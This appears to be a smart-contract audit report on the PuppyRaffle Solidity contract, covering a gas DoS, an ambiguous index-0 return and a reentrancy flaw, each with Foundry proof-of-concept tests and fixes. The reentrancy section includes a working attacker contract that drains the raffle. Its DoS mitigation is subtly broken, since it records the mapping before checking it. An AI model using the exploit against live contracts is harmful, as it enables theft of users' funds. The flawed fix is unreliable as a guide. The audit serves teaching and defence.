## **[M-1]** Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

### **Description**: 
- The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.

```solidity
// Check for duplicates
// @audit possible DoS
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```
​

### **Impact**: 
- The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.
​
- An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.

### **Proof of Concept**:
- If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6252048 gas
- 2nd 100 players: ~18068138 gas
​
This is more than 3x more expensive for the second 100 players.

<details>
<summary>Proof Of Code</summary>

```solidity
    function testDenialOfService() public {
        // Foundry lets us set a gas price
        vm.txGasPrice(1);

        // Creates 100 addresses
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < players.length; i++) {
            players[i] = address(i);
        }

        // Gas calculations for first 100 players
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players: ", gasUsedFirst);

        // Creates another array of 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersTwo.length; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        // Gas calculations for second 100 players
        uint256 gasStartTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndTwo = gasleft();
        uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
        console.log("Gas cost of the second 100 players: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```
</details>

### **Recommended Mitigation**:
<details>
<summary>Code Snippet</summary>

``` diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }
​
-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    }
```
</details>


## **[I-1]** Ambiguity in `PuppyRaffle::getActivePlayerIndex` logic. A user at index 0 will be indistinguishable from a non-existing user

### **Description**:
- Use of `getActivePlayerIndex` function to retrieve the index of a player in the `players` array is paramount in the initiation of a refund. However, if the player is at index 0, the function will return 0, which is indistinguishable from a player not found (also returning 0). This ambiguity can lead to incorrect assumptions about whether a player is active or not.

```solidity
/// @notice a way to get the index in the array
/// @param player the address of a player in the raffle
/// @return the index of the player in the array, if they are not active, it returns 0
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

### **Impact**:
- If a player is at index 0 in the `players` array, any logic that relies on `getActivePlayerIndex` to determine if a player is active may incorrectly assume that the player is not active, leading to potential denial of refunds.

### **Proof of Concept**:
<details>
<summary>Proof of Concept</summary>

```solidity
    function testGetActivePlayerIndexAmbiguity() public {
        // Arrange: Enter 3 players into the raffle
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;

        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        // Act: Get index for player at position 0
        uint256 playerOneIndex = puppyRaffle.getActivePlayerIndex(playerOne);

        // Get index for a player that never entered (should also return 0)
        address nonExistentPlayer = address(0x999);
        uint256 nonExistentIndex = puppyRaffle.getActivePlayerIndex(nonExistentPlayer);

        // Assert: Both return 0, creating ambiguity
        assertEq(playerOneIndex, 0, "Player at index 0 should return 0");
        assertEq(nonExistentIndex, 0, "Non-existent player should return 0");

        // This demonstrates the issue: we cannot distinguish between:
        // 1. A player at index 0 (playerOne)
        // 2. A player not in the raffle (nonExistentPlayer)
        assertEq(
            playerOneIndex, nonExistentIndex, "Cannot distinguish between player at index 0 and non-existent player"
        );

        console.log("Player at index 0 returns:", playerOneIndex);
        console.log("Non-existent player returns:", nonExistentIndex);
        console.log("Both return the same value, creating ambiguity!");
    }
```
</details>

### **Recommended Mitigation**:
- Modify the `getActivePlayerIndex` function to return a sentinel value (e.g., `type(uint256).max`) when a player is not found, ensuring that index 0 is distinguishable from a non-existing player.

```diff
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
-    return 0;
+    return type(uint256).max; // Sentinel value indicating "not found"
}

```


## **[H-1]** Reentrancy vulnerability in `PuppyRaffle::refundPlayer` can allow the redunding address to drain the contract funds

### **Description**:
- The contract `Puppyraffle::refundPlayer` function does not obey the CEI pattern. It sends Ether to the player before updating contract state, allowing a malicious contract/user to refund and drain the funds by reentering the `refundPlayer` function multiple times before the state is updated.

```solidity
    /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
    /// @dev This function will allow there to be blank spots in the array
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

### **Impact**:
- The refunding user/contract can drain the entire contract of its funds via renetrancy, leading to loss of funds for other players in the raffle.

### **Proof of Concept**:
<details>
<summary>Reentrancy Proof</summary>

```solidity
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 attackerIndex;
    uint256 attackCount;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function attack(uint256 _attackerIndex) external {
        attackerIndex = _attackerIndex;
        attackCount = 0;
        puppyRaffle.refund(attackerIndex);
    }
    
    // Fallback function that reenters
    receive() external payable {
        attackCount++;
        // Limit reentrancy to prevent infinite loop and gas exhaustion
        if (attackCount < 5 && address(puppyRaffle).balance >= puppyRaffle.entranceFee()) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

function testReentrancyAttack() public {
    // Arrange: Setup attack contract and legitimate players
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    
    // Deploy attack contract
    ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
    
    // Attacker enters the raffle
    address attackerAddress = address(attacker);
    vm.deal(attackerAddress, entranceFee);
    
    address[] memory attackerArray = new address[](1);
    attackerArray[0] = attackerAddress;
    
    vm.prank(attackerAddress);
    puppyRaffle.enterRaffle{value: entranceFee}(attackerArray);
    
    // Record initial balances
    uint256 contractBalanceBefore = address(puppyRaffle).balance;
    uint256 attackerBalanceBefore = attackerAddress.balance;
    
    console.log("Contract balance before attack:", contractBalanceBefore);
    console.log("Attacker balance before attack:", attackerBalanceBefore);
    
    // Act: Execute the attack
    uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(attackerAddress);
    attacker.attack(attackerIndex);
    
    // Assert: Attacker has drained the contract
    uint256 contractBalanceAfter = address(puppyRaffle).balance;
    uint256 attackerBalanceAfter = attackerAddress.balance;
    
    console.log("Contract balance after attack:", contractBalanceAfter);
    console.log("Attacker balance after attack:", attackerBalanceAfter);
    
    // The attacker should have stolen more than just their entrance fee
    assertEq(contractBalanceAfter, 0);
    assert(attackerBalanceAfter > attackerBalanceBefore + entranceFee);
}
```

</details>

### **Recommended Mitigation**:
- Ensure that the contract state is updated before sending the Ether, adhering to the Checks-Effects-Interactions (CEI) pattern. Also, importation and use of the nonRentrant modifier from OpenZeppelin's ReentrancyGuard can provide additional security.

```diff
+   import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
.
.
.
-   contract PuppyRaffle is ERC721, Ownable
+   contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {

-    function refund(uint256 playerIndex) public
+    function refund(uint256 playerIndex) public nonReentrant {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+        players[playerIndex] = address(0);
        payable(msg.sender).sendValue(entranceFee);

-        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
}
```